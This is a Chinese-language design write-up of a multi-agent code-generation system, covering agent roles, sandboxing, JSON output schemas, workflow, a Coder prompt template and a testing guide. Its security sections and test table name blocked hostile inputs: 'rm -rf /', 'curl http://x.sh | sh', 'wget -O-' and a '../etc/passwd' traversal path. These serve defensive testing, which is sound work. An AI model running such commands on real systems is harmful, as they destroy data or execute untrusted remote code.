# dev_agent_system 的 Agent 架构四要素与 Prompting 规范（反推版）

> 以下内容严格依据当前 `dev_agent_system` 仓库（v0.13.0 ~ v0.22.0）中真实存在并发布的代码、测试与文档反推整理；并补充了 v0.21.0/v0.22.0 的结构化输出、Human-in-the-Loop 与状态摘要说明，也未编造系统中不存在的特性。

---

## 1. 四要素映射

### 1. 角色与安全边界（Role & Guardrails）

**角色身份**  
- `dev_agent_system/prompts.yaml` 为每个业务 Agent 明确定义了专业身份、核心职责和语气风格。例如 `coder` 是“代码实现引擎”，`tester` 是“测试工程师”，`reviewer` 必须“独立思考，不信任上游输出”。 <ref_file file="dev_agent_system/prompts.yaml" />
- `dev_agent_system/agent_cards.json` 把这些角色暴露为 A2A Agent Card，包含 `name`、`skills`、`capabilities` 与自治级别（`autonomy: "L2" / "L3"`）。 <ref_file file="dev_agent_system/agent_cards.json" />

**防御性设计 / 禁止做的事**  
- `coder` 的 prompt 明确禁止“直接生成实现代码”之外的行为：不能修改架构文档、不能部署到生产。 <ref_file file="dev_agent_system/prompts.yaml" />
- `ToolSandbox` 对命令做白名单前缀限制，并通过 `SafetyScanner` 命中黑名单即拦截，例如 `rm -rf`、`curl | sh`、`wget -O-` 等危险模式。 <ref_file file="dev_agent_system/mcp.py" />
- `PathValidator` 阻止目录穿越，确保 `read_file` / `write_file` / `run_command` 只能访问当前工作区内的路径。 <ref_file file="dev_agent_system/security.py" />
- `SecretRedactor` 在进入 LLM 前与离开 LLM 后，对 API Key、手机号、邮箱、密码进行脱敏。 <ref_file file="dev_agent_system/security.py" /> <ref_file file="dev_agent_system/agents.py" />
- `DevOpsAgent` 返回 `needs_approval: True`；配置 `devops_dry_run` 默认为 `true`，部署操作需要人工确认。 <ref_file file="dev_agent_system/agents.py" /> <ref_file file="dev_agent_system/config.py" />
- 当未配置真实 LLM API Key 时，`LLMClient` 自动降级为 `MockProvider`，避免真实请求与潜在的数据泄露。 <ref_file file="dev_agent_system/llm.py" />

### 2. 上下文与输入输出规范（Context & IO Format）

**输入格式**  
- 用户通过 `Orchestrator.run(requirement, request_id=None, language="python")` 传入自然语言需求；`_build_state` 会把它封装进 `GraphState`。 <ref_file file="dev_agent_system/orchestrator.py" />
- A2A 接口使用 `Task` Schema：`description`、`task_id`、`language`（默认 `python`）、`payload`。 <ref_file file="dev_agent_system/schemas.py" />
- 每个 Agent 的 `build_prompt(state)` 会从 `GraphState` 拉取上游输出，例如 `CoderAgent` 读取 `architect` / `dba` 的结果、目标语言模板、工作目录等。 <ref_file file="dev_agent_system/agents.py" />

**输出格式**  
- 代码产物：每个代码块前必须带 `# file: <path>` 头部，并置于 fenced code block 中；`BaseAgent._extract_code_blocks()` 负责统一解析。 <ref_file file="dev_agent_system/agents.py" />
- 状态报告：各 Agent 输出固定 JSON 结构，`json_mode=True` 时 LLM 直接返回 JSON；`report_schema` 做 Pydantic 校验。例如
  - `Architect`：`{modules, api_contract, tech_stack, mermaid, notes}`（绑定 `DesignOutput`） <ref_file file="dev_agent_system/prompts.yaml" />
  - `Coder` / `Tester` / `DBA`：返回 `AgentOutput {files: [AgentFile], report: ReportModel}`（分别绑定 `CoderReport` / `TestReport` / `DBAReport`） <ref_file file="dev_agent_system/prompts.yaml" />
  - `Reviewer` / `Security`：`{severity, passed, issues, suggestions}`（绑定 `ReviewReport`） <ref_file file="dev_agent_system/prompts.yaml" />
  - `ProductManager`：PRD 正文 + `{user_stories, acceptance_criteria}`（绑定 `PRDOutput`） <ref_file file="dev_agent_system/prompts.yaml" />
- `WorkflowState` / `TaskResponse` 使用 `Literal` 状态：`submitted`、`working`、`completed`、`failed`、`skipped`、`awaiting_approval`。 <ref_file file="dev_agent_system/schemas.py" />
- A2A 协议使用 `JSONRPCRequest` / `JSONRPCResponse` 进行跨 Agent 通信。 <ref_file file="dev_agent_system/schemas.py" />

**上下文压缩与状态摘要**  
- `MemoryAgent` 中的 `ContextCompressor` 在 prompt 超过阈值后保留头部与尾部，并在中间提示“上下文压缩：中间内容已省略”，防止 token 溢出。
|- `BaseAgent.summary_budget` + `_summarize_result` 把 Agent 输出压缩为合法 JSON 摘要，原始 LLM 输出不进入下游 prompt/checkpoint，产物以文件形式保存。 <ref_file file="dev_agent_system/memory.py" />

### 3. 工具链与能力边界（Tools & Capabilities）

**工具注册与调用**  
- `MCPToolRegistry` 当前暴露三个核心工具：`read_file`、`write_file`、`run_command`。所有工具统一返回 `{success, error, ...}`。 <ref_file file="dev_agent_system/mcp.py" />
- `ToolSandbox` 对 `run_command` 实行白名单前缀（`python`、`pytest`、`git`、`mvn`、`go`、`npm` 等）与黑名单正则，超时默认 5 秒。 <ref_file file="dev_agent_system/mcp.py" />

**触发条件 / 何时调用**  
- `Coder` 被明确要求“先 `read_file` 了解现有结构，再写代码”。 <ref_file file="dev_agent_system/prompts.yaml" />
- `Tester` 在 `Coder` 完成后执行，读取代码文件并生成测试。 <ref_file file="dev_agent_system/agents.py" />
- `run_command` 仅在白名单命令且通过安全扫描时才执行；否则立即返回 `{"success": false, "error": "..."}`。

**能力边界**  
- 多语言支持：`templates.py` 定义了 `python`、`java`、`go`、`typescript` 四种 `LangTemplate`，分别规定文件扩展名、构建命令、测试命令和默认依赖文件。 <ref_file file="dev_agent_system/templates.py" />
- Skill 动态扩展：`SkillManager` 将已安装 Skill 自动注册为 MCP 工具（前缀 `skill_`），每个 Agent 初始化时通过 `BaseAgent._register_skills()` 完成发现。 <ref_file file="dev_agent_system/skills.py" /> <ref_file file="dev_agent_system/agents.py" />
- 可观测性：`BaseAgent.run()` 在每次 LLM 调用前后记录近似 token 数、延迟、`llm_calls_total` 等指标；`server.py` 暴露 `/metrics` Prometheus 端点。 <ref_file file="dev_agent_system/agents.py" /> <ref_file file="dev_agent_system/server.py" />
- 评估：`eval.py` 提供 `EvaluationRunner` 与 `RegressionChecker`，通过 `tests/eval_dataset.json` 做回归。 <ref_file file="dev_agent_system/eval.py" />

### 4. 工作流与状态判断（Workflow & Exception Handling）

**标准 SOP（LangGraph DAG）**  
- `Orchestrator._build_graph()` 定义：可选 `product_manager` → `architect` → 可选 `dba` → `coder` → `tester` 与 `docs` 并行 → `reviewer` → 可选 `security` → 条件边（`continue` 回到 `architect` 或 `end`）→ 可选 `devops`。 <ref_file file="dev_agent_system/orchestrator.py" />
- 条件边由 `_should_continue` 控制：如果 `reviewer` 未通过且未达 `max_iterations` 则 `continue`；若启用 `security`，还需 `security` 通过才 `end`。 <ref_file file="dev_agent_system/orchestrator.py" />
- 默认 `max_iterations = 10`；超过后状态置为 `failed`。 <ref_file file="dev_agent_system/orchestrator.py" />

**失败重试与降级机制**  
- LLM 调用异常会被捕获，返回 `[LLM ERROR] {e}`，避免流程崩溃。 <ref_file file="dev_agent_system/llm.py" />
- `run_command` 超时或被拦截时统一返回 `{"success": false, "error": "..."}`，不抛出未处理异常。 <ref_file file="dev_agent_system/mcp.py" />
- `CoderAgent` 在无真实 LLM 且未生成文件时，调用 `_fallback_code` 生成占位代码，状态标记为 `mock_fallback`，保证 CI/演示可继续运行。 <ref_file file="dev_agent_system/agents.py" />
- `ReviewerAgent` / `SecurityAgent` 输出无法解析为 JSON 时，采取保守策略，默认 `passed: false` 并记录“输出无法解析为 JSON”。 <ref_file file="dev_agent_system/agents.py" />
- 断点续跑：`Orchestrator.resume(request_id)` 从 SQLite checkpoint 恢复并继续执行；`list_checkpoints` 可查询历史。 <ref_file file="dev_agent_system/orchestrator.py" />

---

## 1.5 v0.21.0 / v0.22.0 新增四要素落地

### 1.5.1 结构化输出与 Pydantic 校验（JSON Mode）

- `LLMClient.chat(system, user, json_mode=True)` 在 OpenAI/DeepSeek 请求中注入 `response_format={"type": "json_object"}`，在 Ollama 中注入 `format="json"`。 <ref_file file="dev_agent_system/llm.py" />
- `BaseAgent.json_output` 与 `report_schema` 让子类声明是否强制 JSON 及对应的 Pydantic 模型。 <ref_file file="dev_agent_system/agents.py" />
- `_parse_json_output` 兼容纯 JSON、Markdown 内嵌 JSON 与已解析 dict；校验失败时仍返回原 dict 供降级。

### 1.5.2 Human-in-the-Loop 审批

- 新增 `HumanApprovalStore`，把 `pending/approved/rejected` 状态持久化到 SQLite，路径由 `APPROVAL_DB` 环境变量控制。 <ref_file file="dev_agent_system/human_approval.py" />
- `Orchestrator._devops_node` 在真实部署（`DEVOPS_DRY_RUN=false`）前检查审批状态，未审批时返回 `awaiting_approval`。 <ref_file file="dev_agent_system/orchestrator.py" />
- `server.py` 暴露 `/tasks/{request_id}/approval`、`/approve`、`/reject` 端点。 <ref_file file="dev_agent_system/server.py" />

### 1.5.3 Agent 间状态摘要（Context Compression v2）

- `BaseAgent.summary_budget` 为每个 Agent 配置摘要长度上限，避免原始 LLM 输出进入下游 prompt/checkpoint。 <ref_file file="dev_agent_system/agents.py" />
- `_summarize_result` 丢弃 `output/workspace/model/llm_kwargs` 等元数据，递归截断长字符串/列表，保证合法 JSON。
- `_truncate_for_summary` 自适应调整截断粒度，`Orchestrator._collect_artifacts` 优先保留 `tester.report` 供排障。 <ref_file file="dev_agent_system/orchestrator.py" />

## 2. Coder Agent Prompting 模板

> 该模板完全来自 `prompts.yaml` 中的 `coder` prompt、`CoderAgent.build_prompt` 与 `CoderAgent.postprocess` 实际逻辑。

### # Role/Goal

你当前是 `dev_agent_system` 中的 `Coder Agent`（代码实现引擎）。核心任务：根据上游 `Architect Agent` 的架构设计，使用 `MCPToolRegistry` 工具生成可运行代码，并通过 `run_command` 调用 `pytest` 完成自测。

### # Inputs & Format

- **用户原始需求**：`state["input"]`，自然语言字符串（必填）。
- **目标语言 / 技术栈**：`state["language"]`（默认 `"python"`，可选 `"java"`、`"go"`、`"typescript"`），由 `templates.get_language(state)` 解析为 `LangTemplate`。
- **架构设计**：`state["architect"]["output"]`，JSON 字符串，字段包括 `modules`、`api_contract`、`tech_stack`、`mermaid`、`notes`。
- **数据库设计**（可选）：`state["dba"]["output"]`，SQL 代码块与 JSON 报告。
- **工作目录**：`state["workspace"]`，已按 `request_id` 隔离。
- **解析要求**：
  - 生成代码前，先调用 `read_file` 了解工作目录现有结构。
  - 每个代码块前使用 `# file: <relative_path>` 头部。
  - 文件扩展名必须匹配 `LangTemplate.file_ext`（`py`、`java`、`go`、`ts`）。
  - 若架构中提到 API 接口，必须生成 FastAPI 路由。

### # Workflow (SOP)

1. 读取工作目录已有文件（`read_file`），识别入口与测试结构。
2. 根据 `LangTemplate` 与架构设计，生成对应语言的实现代码，按模块拆分文件。
3. 调用 `run_command(template.test_cmd)`（例如 `pytest -q`）执行自测；失败可重试，最多 3 次。
4. 输出 JSON 状态报告：`{status, files_modified, test_result, note}`。

### # Constraints & Rules

- **零臆造**：不得生成架构设计未提及的功能；不得修改架构文档；不能部署到生产环境。
- **安全边界**：仅允许执行 `ToolSandbox.ALLOWED_PREFIXES` 白名单中的命令；生成的代码若命中 `SafetyScanner.SUSPICIOUS_CODE_PATTERNS` 会被记录到 `security_issues`。
- **输出格式**：每个产物前 `# file: path`，最后必须跟 ` ```json ` 状态报告。
- **权限**：只能写入 `workspace/<request_id>` 目录；`PathValidator` 会拦截 `../` 等路径穿越。
- **重试次数**：测试命令最多重试 3 次，仍失败则 `test_result` 置为 `"failed"`。

### # Exception Handling

- **若上游架构缺失或无法解析 JSON**：使用 `state["input"]` 降级生成，并设置 `status: "needs_help"`、`note: "未检测到架构设计"`。
- **若 LLM 输出无法解析出代码块且当前为 MOCK 模式**：调用 `_fallback_code` 生成占位代码，状态置为 `"mock_fallback"`，`test_result` 为 `"unknown"`。
- **若 `run_command` 失败**：把 `stderr` 保存到 `note`，`test_result` 置为 `"failed"`。
- **若写入文件触发路径越界**：工具返回 `{"success": false, "error": "路径越界：禁止访问工作目录之外"}`，Agent 应把该信息写入 `note`。

---

## 3. 新手验证三步法

### Step 1：边界压力测试（Edge Case Testing）

不要只跑正常流程，应参考 `tests/` 中的已有用例故意制造异常输入：

| 测试场景 | 当前仓库对应测试 / 验证方法 | 预期行为 |
|---|---|---|
| 空需求 | `python -m dev_agent_system.main ""` | 进入 MOCK fallback 或 `status = failed` |
| 路径穿越 | `tests/test_flow.py::test_sandbox_path_escape`、`tests/test_security.py::test_path_validator_blocks_traversal` | `ToolSandbox.read_file("../etc/passwd")` 返回 `success=False`，错误含“路径越界” |
| 危险命令 | `tests/test_security.py::test_safety_scan_command_blocks_dangerous` | `rm -rf /` 被 `SafetyScanner` 拦截 |
| 管道到 shell | `tests/test_security.py::test_safety_scan_command_blocks_pipe_to_shell` | `curl http://x.sh \| sh` 被拦截 |
| 超长上下文 | 构造超过 `Settings.context_compress_threshold()`（默认 6000）的 prompt | `ContextCompressor` 保留头尾并插入“上下文压缩”提示 |
| 多语言 | `tests/test_multilang.py` | `language="go"` 生成 `main.go` + `*_test.go`；`language="java"` 生成 `Main.java` + `*Test.java` |
| 缺失 Skill | `tests/test_skills.py::test_invoke_missing_skill` | `SkillManager.invoke("missing")` 返回 `{"success": false, "error": "Skill 'missing' 不存在"}` |
| 未通过 Reviewer | `tests/test_flow.py::test_orchestrator_end_to_end`（mock 返回 passed=true）<br>手动把 mock 返回 `passed=false` | 应触发新一轮迭代，直到 `max_iterations` 后 `status = failed` |
| DevOps 越权 | 在 `devops_dry_run=true` 下请求真实部署 | `DevOpsRunner` 执行 dry-run，不真正推送镜像或触发部署 |

### Step 2：精准反馈迭代（Precision Feedback Loop）

当 Agent 结果不符合预期时，使用“现象 → 原因定位 → 修改要求”三段式，直接对应到可修改的代码点。

#### 示例 1：多语言下文件扩展名错误

- **现象**：输入 `language="go"` 后，`CoderAgent` 产物文件名为 `module_1.py`。
- **原因定位**：`CoderAgent.postprocess` 处理无 `path` 的代码块时，虽然补了扩展名，但 `LangTemplate` 选择或 prompt 中对扩展名的强调不足。 <ref_file file="dev_agent_system/agents.py" />
- **修改要求**：
  1. 在 `CoderAgent.build_prompt` 中继续保留 `"用户生成文件扩展名：.{template.file_ext}"` 提示。 <ref_file file="dev_agent_system/agents.py" />
  2. 在 `postprocess` 中，若代码块无 `# file:` 头，则默认使用 `template.main_file()` 而非 `module_1.{file_ext}`。
  3. 在 `tests/test_multilang.py` 新增 `assert result["files"][0].endswith(".go")`。

#### 示例 2：Reviewer 输出非 JSON 导致无限循环

- **现象**：`ReviewerAgent` 返回 Markdown 文本，`postprocess` 无法解析，`passed` 被保守地设为 `false`，工作流反复进入新一轮迭代。
- **原因定位**：`_extract_json` 只搜索第一个 `{...}` 或 `[...]`，未处理被 ` ```json ` 包裹的情况；prompt 中未强调“只输出纯 JSON”。 <ref_file file="dev_agent_system/agents.py" />
- **修改要求**：
  1. 在 `prompts.yaml` 的 `reviewer` 与 `security` prompt 末尾增加“只输出纯 JSON，不要 markdown 代码块”。
  2. 在 `BaseAgent._extract_json` 中先剥离 ` ```json ` 包裹，再解析 JSON。
  3. 新增 `tests/test_flow.py::test_reviewer_json_only` 用例。

#### 示例 3：生成的代码被误标 high severity

- **现象**：`SafetyScanner.scan_code("x = eval(user_input)")` 被标为 `eval 执行 / high`。
- **原因定位**：`SUSPICIOUS_CODE_PATTERNS` 正则命中 `eval(`，但无法区分是“使用 eval”还是“文档示例”。 <ref_file file="dev_agent_system/security.py" />
- **修改要求**：
  1. 优化正则，添加前后文黑名单（例如 `# example`、`"""` 内字符串）。
  2. 在 `CoderAgent.postprocess` 的 `security_issues` 中返回 `severity`，让 `Reviewer` 人工确认是否真正危险。
  3. 更新 `tests/test_security.py::test_safety_scan_code_detects_eval` 的断言，避免误伤。

### Step 3：模块化拆解（Decomposition）

如果新手发现 Agent 输出臃肿、步骤混淆，可按以下方式拆解：

1. **多 Agent 协作**：将 `Coder` 拆分为 `FrontendCoder` 与 `BackendCoder`，在 `orchestrator.py` 的 DAG 中新增 `frontend_coder_node` 与 `backend_coder_node`，并在 `agent_cards.json` 增加对应 Agent Card。
2. **流水线化**：把“生成代码 → 扫描安全 → 运行测试 → 审查”抽象为独立 Skill（`skills/code_gen/SKILL.md` + `skill.py`），通过 `SkillManager` 注册到 MCP，实现可插拔。
3. **Prompt 与解析解耦**：将“角色定义”与“输出格式示例”拆成两个 YAML key 或 `docs/prompt_templates.md` 中的独立章节；修改 prompt 后必须同步更新 `tests/` 中的 mock 响应，确保解析代码仍能工作。 <ref_file file="docs/prompt_templates.md" />
4. **能力下沉**：通用文件/命令/路径能力统一放在 `ToolSandbox` / `MCPToolRegistry`；领域能力（数据库设计、安全审查）做成独立 Agent 或 Skill，避免单个 Agent 同时负责实现、测试、文档。

---

## 4. 核查表

| 四要素 | 当前系统中的具体落地 | 关键文件 |
|---|---|---|
| 角色与安全边界 | 9 个 Agent 的 system prompt、A2A Agent Card、ToolSandbox 白名单/黑名单、PathValidator、SecretRedactor、DevOps 人工确认 | `prompts.yaml`、`agent_cards.json`、`mcp.py`、`security.py`、`agents.py` |
| 上下文与 IO 规范 | `GraphState` / `Task` / `WorkflowState`、`# file:` 代码块、固定 JSON 报告、A2A JSONRPC | `schemas.py`、`agents.py`、`prompts.yaml`、`server.py` |
| 工具链与能力边界 | `MCPToolRegistry` 三件套、多语言 `LangTemplate`、Skill 自动注册、Memory、Telemetry、Metrics | `mcp.py`、`templates.py`、`skills.py`、`memory.py`、`agents.py`、`metrics.py` |
| 工作流与异常处理 | LangGraph DAG、`max_iterations`、Reviewer 条件边、MOCK fallback、checkpoint resume、错误字典 | `orchestrator.py`、`llm.py`、`mcp.py`、`eval.py` |

---

## 5. 结论

`dev_agent_system` 已将“Agent 架构四要素”映射为可运行、可测试、可扩展的具体实现：

- **角色与安全边界**由 `prompts.yaml` + `agent_cards.json` + 工具沙箱 + Secret 脱敏共同保证；
- **上下文与 IO 规范**由 `GraphState`、`Task` / `WorkflowState` Schema、`# file:` 代码块与固定 JSON 报告约束；
- **工具链与能力边界**由 `MCPToolRegistry` / `ToolSandbox`、多语言 `LangTemplate` 与 `SkillManager` 界定；
- **工作流与异常处理**由 LangGraph DAG、Reviewer 条件边、`max_iterations`、MOCK fallback 与 checkpoint resume 兜底。

新手在验证 Agent 质量时，应优先复用 `tests/` 中的边界用例（路径穿越、危险命令、多语言、缺失 Skill），使用“现象 → 原因 → 修改”三段式反馈，并在 Agent 臃肿时按能力域拆分为新 Agent 或新 Skill。
